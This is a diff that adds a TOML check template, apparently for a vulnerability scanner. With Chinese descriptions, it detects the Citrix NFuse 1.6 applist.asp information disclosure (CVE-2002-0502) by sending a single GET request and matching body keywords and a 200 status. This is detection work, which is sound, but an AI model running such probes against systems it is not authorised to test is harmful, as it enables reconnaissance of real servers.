@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "检测 Citrix NFuse 1.6 applist.asp 页面是否存在未授权访问导致的已发布应用程序列表信息泄露"
+id = "POC-AVE-2002-0319"
+name = "Citrix NFuse 1.6 applist.asp 信息泄露 PoC"
+severity = "medium"
+tags = ["ave-2002-0319"]
+vuln_id = [
+    "CVE-2002-0502",
+    "AVE-2002-0319",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/applist.asp"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Application",
+    "Published",
+    "Application Name",
+    "applist",
+]
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [200]
+type = "status"
